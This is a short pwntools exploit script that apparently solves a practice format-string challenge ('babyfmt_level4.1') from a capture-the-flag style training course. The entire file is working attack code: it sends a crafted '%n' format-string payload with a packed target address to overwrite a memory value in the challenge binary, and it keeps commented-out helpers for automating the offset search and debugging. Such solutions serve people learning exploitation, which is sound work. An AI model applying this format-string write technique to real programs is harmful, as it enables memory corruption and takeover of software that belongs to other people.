from pwn import *

context.arch = 'amd64'

# def exec_fmt(payload):
#     p = process("/challenge/babyfmt_level4.1")
#     p.recv()
#     p.send(payload)
#     result = p.recvall()
#     print(result)
#     return result


# fmtstr = FmtStr(exec_fmt)
# print("fmtstr offset: {}".format(fmtstr.offset))
# padding = b"A" * fmtstr.padlen


#context.terminal = ['tmux', 'splitw', '-h']
#p = gdb.debug("/challenge/babyfmt_level4.1", gdbscript="source /opt/gef/gef.py")
p = process("/challenge/babyfmt_level4.1")
#payload = padding + fmtstr_payload(fmtstr.offset, {0x404140: 0x9f})
payload = b'AA%157c%37$nAAAAAA' + p64(0x404140)
print(payload)
p.send(payload)
print(p.recvall().decode())